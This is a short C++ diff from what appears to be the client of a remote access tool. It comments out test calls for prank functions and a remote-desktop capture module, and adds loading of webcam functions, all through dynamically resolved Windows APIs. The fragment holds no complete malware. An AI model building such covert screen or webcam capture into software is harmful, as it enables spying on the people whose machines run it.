@@ -114,14 +114,15 @@ Cliente::Cliente() {
 }
 
 void Cliente::TEST() {
-    this->mod_dynamic->LoadFunProcs();
+    /*this->mod_dynamic->LoadFunProcs();
     this->mod_Fun = new modFun(this->mod_dynamic->USER32_FUN, this->mod_dynamic->WINMM);
     this->mod_Fun->m_CD(TRUE);
     this->mod_Fun->m_Msg("1337 :v", "Testing", MB_ICONERROR);
 
     this->mod_dynamic->LoadRDProcs();
-    this->mod_RemoteDesk = new mod_RemoteDesktop(this->mod_dynamic->USER32_RD, this->mod_dynamic->GDI32_RD, this->mod_dynamic->GDIPLUS_RD, this->mod_dynamic->OLE32);
+    this->mod_RemoteDesk = new mod_RemoteDesktop(this->mod_dynamic->USER32_RD, this->mod_dynamic->GDI32_RD, this->mod_dynamic->GDIPLUS_RD, this->mod_dynamic->OLE32);*/
 
+    this->mod_dynamic->LoadCamProcs();
     this->DestroyClasses();
 }
 
